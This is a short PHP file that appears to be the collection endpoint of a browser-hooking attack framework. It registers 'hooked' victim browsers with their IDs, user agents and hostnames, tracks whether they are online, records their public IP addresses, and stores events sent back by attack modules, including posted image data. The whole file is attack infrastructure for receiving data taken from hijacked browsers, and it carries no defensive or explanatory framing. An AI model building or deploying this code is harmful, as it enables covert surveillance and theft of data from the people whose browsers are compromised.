<?php
    include_once('inc/rcv.inc.php');

    // New hooked browser
    if(isset($_GET['action']) && $_GET['action'] == 'initHook') {
        initHook($_GET['browserId'], $_GET['userAgent'], $_GET['hostname']);        
    }

    // Is hooked browser online/offline ?
    if(isset($_GET['action']) && $_GET['action'] === 'heartbeat') {
        heartbeat($_GET['browserId']);
    }

    // Retrieve public IP
    if(isset($_GET['action']) && $_GET['action'] === 'getPublicIP') {
        getPublicIP($_GET['browserId'], $_GET['publicIP']);
    }

    // Analyse event from hooked browsers
    if(isset($_GET['type']) && !empty($_GET['type'])) {
        addEvent($_GET['browserId'], $_GET['type'], $_GET['module'], $_GET['event'], $_POST['imgDataURL']);
    }
?>